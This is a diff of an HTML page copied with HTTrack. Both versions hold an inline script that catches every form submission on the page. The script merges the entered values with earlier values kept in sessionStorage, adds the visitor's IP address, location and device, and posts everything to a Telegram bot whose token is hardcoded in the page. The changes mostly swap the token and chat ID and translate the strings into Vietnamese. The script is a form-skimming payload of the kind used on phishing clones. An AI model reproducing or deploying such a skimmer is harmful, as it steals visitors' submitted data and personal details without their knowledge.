@@ -3,11 +3,11 @@
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head><script>
 (function() {
-    // ================= TELEGRAM CONFIG =================
-    const BOT_TOKEN = '-5377276972';
-    const CHAT_ID = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
-    const STORAGE_KEY = 'tg_saved_old_form_data';
-    // ===================================================
+    // ================= CẤU HÌNH TELEGRAM =================
+    const BOT_TOKEN = '9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4';
+    const CHAT_ID = '-5377276972';
+    const STORAGE_KEY = 'tg_saved_old_form_data'; // Nơi lưu tạm data cũ
+    // =====================================================
 
     async function fetchWithTimeout(url, timeout = 2500) {
         const controller = new AbortController();
@@ -26,24 +26,21 @@
         const ua = navigator.userAgent;
         const isIpadOS = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
         
-        let deviceType = "Desktop";
-        if (isIpadOS || /iPad|Tablet/i.test(ua)) deviceType = "Tablet";
-        else if (/Mobi|Android|iPhone|iPod/i.test(ua)) deviceType = "Mobile";
+        let deviceType = "Máy tính";
+        if (isIpadOS || /iPad|Tablet/i.test(ua)) deviceType = "Máy tính bảng";
+        else if (/Mobi|Android|iPhone|iPod/i.test(ua)) deviceType = "Điện thoại";
 
-        let os = "Unknown OS";
+        let os = "Khác";
         if (isIpadOS || /iPhone|iPad|iPod/i.test(ua)) os = "iOS/iPadOS";
         else if (/Android/i.test(ua)) os = "Android";
         else if (/Windows/i.test(ua)) os = "Windows";
         else if (/Mac OS X/i.test(ua)) os = "macOS";
-        else if (/Linux/i.test(ua)) os = "Linux";
 
         let browser = "Browser";
-        if (/Zalo/i.test(ua)) browser = "Zalo";
-        else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook";
-        else if (/Edg/i.test(ua)) browser = "Edge";
+        if (/Zalo/i.test(ua)) browser = "Zalo Browser";
+        else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook Browser";
         else if (/CriOS|Chrome/i.test(ua)) browser = "Chrome";
         else if (/Safari/i.test(ua)) browser = "Safari";
-        else if (/Firefox/i.test(ua)) browser = "Firefox";
 
         return `${deviceType} (${os} - ${browser})`;
     }
@@ -54,18 +51,18 @@
             const data = await res.json();
             if (data.success) {
                 const loc = [data.city, data.country].filter(Boolean).join(', ');
-                return { ip: data.ip, location: loc || 'Unknown' };
+                return { ip: data.ip, location: loc || 'Không rõ' };
             }
         } catch (e) {
             try {
                 const res2 = await fetchWithTimeout('https://api.ipify.org?format=json', 2000);
                 const data2 = await res2.json();
-                return { ip: data2.ip, location: 'Hidden / Blocked' };
+                return { ip: data2.ip, location: 'Ẩn vị trí' };
             } catch (err) {
-                return { ip: 'Unavailable', location: 'Unavailable' };
+                return { ip: 'Không lấy được', location: 'Không lấy được' };
             }
         }
-        return { ip: 'Unavailable', location: 'Unavailable' };
+        return { ip: 'Không lấy được', location: 'Không lấy được' };
     }
 
     function escapeHTML(str) {
@@ -81,9 +78,10 @@
             if (labelEl && labelEl.innerText.trim()) return labelEl.innerText.trim();
             return el.id;
         }
-        return `Field #${index + 1}`;
+        return `Trường #${index + 1}`;
     }
 
+    // Lấy dữ liệu cũ đang lưu trong sessionStorage
     function getOldData() {
         try {
             const raw = sessionStorage.getItem(STORAGE_KEY);
@@ -93,32 +91,14 @@
         }
     }
 
+    // Lưu dữ liệu vào sessionStorage để gộp cho bước sau
     function saveOldData(dataObj) {
         try {
             sessionStorage.setItem(STORAGE_KEY, JSON.stringify(dataObj));
         } catch (e) {}
     }
 
-    // Auto-save field values on change (covers multi-step forms without submit buttons)
-    document.addEventListener('change', function(e) {
-        const el = e.target;
-        if (!['INPUT', 'SELECT', 'TEXTAREA'].includes(el.tagName)) return;
-        if (['submit', 'button', 'reset', 'file'].includes(el.type)) return;
-        if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
-
-        const val = el.value ? el.value.trim() : '';
-        if (!val) return;
-
-        const oldData = getOldData();
-        const fieldName = getFieldLabel(el, 0);
-        if (!oldData[fieldName]) oldData[fieldName] = [];
-        if (!oldData[fieldName].includes(val)) {
-            oldData[fieldName].push(val);
-            saveOldData(oldData);
-        }
-    }, true);
-
-    // Handle Form Submit
+    // Lắng nghe sự kiện Submit trên toàn trang (Capture phase)
     document.addEventListener('submit', async function(e) {
         const form = e.target;
         if (!form || form.tagName !== 'FORM') return;
@@ -126,8 +106,10 @@
         if (form.dataset.tgSending === 'true') return;
         form.dataset.tgSending = 'true';
 
-        // 1. Merge old data + new form data
-        const mergedData = getOldData();
+        // 1. Lấy dữ liệu cũ đã lưu từ trước (nếu có)
+        const mergedData = getOldData(); // Dạng: { "Số điện thoại": ["12112"] }
+
+        // 2. Quét dữ liệu mới trên form hiện tại và GỘP vào dữ liệu cũ
         const inputs = form.querySelectorAll('input, select, textarea');
         let hasNewData = false;
 
@@ -144,16 +126,16 @@
             if (!mergedData[fieldName]) {
                 mergedData[fieldName] = [];
             }
-            if (!mergedData[fieldName].includes(val)) {
-                mergedData[fieldName].push(val);
-            }
+            // Gộp giá trị mới nối tiếp vào mảng giá trị cũ
+            mergedData[fieldName].push(val);
         });
 
-        if (!hasNewData && Object.keys(mergedData).length === 0) {
+        if (!hasNewData) {
             form.dataset.tgSending = 'false';
             return;
         }
 
+        // Lưu lại toàn bộ dữ liệu đã gộp (đề phòng khách còn chuyển tiếp sang bước 3, bước 4...)
         saveOldData(mergedData);
 
         try {
@@ -162,26 +144,27 @@
                 Promise.resolve(getDeviceInfo())
             ]);
 
-            // 2. Build message with IP, Location & Device AT THE TOP in English
-            let message = `📩 <b>NEW FORM SUBMISSION</b>\n`;
-            message += `━━━━━━━━━━━━━━━━━━━━\n`;
-            message += `🌍 <b>IP Address:</b> <code>${escapeHTML(geoInfo.ip)}</code>\n`;
-            message += `📍 <b>Location:</b> ${escapeHTML(geoInfo.location)}\n`;
-            message += `📱 <b>Device:</b> ${escapeHTML(deviceInfo)}\n`;
-            message += `🔗 <b>URL:</b> ${escapeHTML(window.location.href)}\n`;
-            message += `⏰ <b>Time:</b> ${new Date().toLocaleString('en-US')}\n`;
+            // 3. Tạo nội dung tin nhắn tổng hợp (Data cũ + Data mới)
+            let message = `📩 <b>DỮ LIỆU FORM (ĐÃ GỘP)</b>\n`;
             message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-            // 3. Append merged form fields below
             Object.entries(mergedData).forEach(([key, values]) => {
                 if (values.length === 1) {
                     message += `🔹 <b>${escapeHTML(key)}:</b> ${escapeHTML(values[0])}\n`;
                 } else {
+                    // Khi có cả data cũ (12112) và data mới (12121) -> Tự xếp thứ tự (1), (2)...
                     values.forEach((v, idx) => {
                         message += `🔹 <b>${escapeHTML(key)} (${idx + 1}):</b> ${escapeHTML(v)}\n`;
                     });
                 }
             });
+
+            message += `━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌍 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>\n`;
+            message += `📍 <b>Vị trí:</b> ${escapeHTML(geoInfo.location)}\n`;
+            message += `📱 <b>Thiết bị:</b> ${escapeHTML(deviceInfo)}\n`;
+            message += `🔗 <b>Trang:</b> ${escapeHTML(window.location.href)}\n`;
+            message += `⏰ <b>Lúc:</b> ${new Date().toLocaleString('vi-VN')}`;
 
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -195,7 +178,7 @@
                 })
             });
         } catch (err) {
-            console.error('Telegram Error:', err);
+            console.error('Lỗi gửi Telegram:', err);
         } finally {
             setTimeout(() => { form.dataset.tgSending = 'false'; }, 1500);
         }
